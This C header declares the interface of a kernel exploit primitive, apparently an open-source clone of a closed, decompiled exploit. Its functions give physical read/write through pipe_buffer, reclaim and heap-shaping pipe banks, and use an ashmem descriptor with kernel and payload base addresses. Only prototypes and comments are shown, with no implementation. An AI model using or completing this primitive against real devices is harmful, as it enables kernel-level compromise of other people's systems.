#ifndef OSS_CLONE_PIPE_PHYSRW_H
#define OSS_CLONE_PIPE_PHYSRW_H

#include <stddef.h>
#include <stdint.h>

/* FUN_00108808 requests the second mm_struct reclaim from the main trigger
 * loop, then waits for it. The loop should call this when pending. Returns 0
 * when idle, 1 after a successful service, and -1 after a failed service. */
int oss_pipe_rw_pending(void);
int oss_pipe_rw_service_pending(void);

/* Establishes the closed payload's pipe_buffer physical read/write backend.
 * Safe setup/proof failures are retried with a fresh reclaim up to 12 times.
 * fd is the already-open fake-configfs ashmem descriptor. */
int oss_pipe_rw_install(int fd, uint64_t kernel_base, uint64_t payload_base);

/* Addresses must be in the linear/direct map. Kernel-image globals must be
 * translated to their P0 direct alias by the caller, as in the closed code. */
int oss_pipe_rw_read(int fd, uint64_t addr, void *buf, size_t len);
int oss_pipe_rw_write(int fd, uint64_t addr, const void *buf, size_t len);

/* Kills the reclaim holder, closes both 240-pipe banks, and clears state. */
void oss_pipe_rw_reset(void);

/* Closed prepare_p0_pipe_oracle: order-3 pipe_buffer page, asymmetric
 * 240/256 drain/reclaim banks, then four marker pages per reclaim pipe. */
int oss_prepare_p0_pipe_oracle(uint64_t *pipe_page_base);
int oss_p0_pipe_oracle_capture(void *snapshots, size_t snapshot_size);
int oss_p0_pipe_oracle_advance(void);
int oss_p0_pipe_oracle_narrow(size_t pipe_index);
/* Releases the narrowed pipe only after ownership is local and confirms that
 * the holder and every reclaim descriptor are gone. Fails closed otherwise. */
int oss_p0_pipe_oracle_release_only(void);
/* release_only plus the closed route's fresh physrw-bank request/settle. */
int oss_p0_pipe_oracle_release(void);

#endif
